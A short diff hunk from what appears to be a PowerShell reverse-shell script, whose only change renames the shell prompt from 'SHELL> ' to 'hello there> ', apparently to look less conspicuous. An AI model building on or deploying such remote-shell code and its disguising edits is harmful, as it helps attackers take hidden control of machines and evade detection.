@@ -12,7 +12,7 @@ $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
 
 function WriteToStream ($String) {
     [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
-    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Write($String + 'hello there> ')
     $StreamWriter.Flush()
 }
 
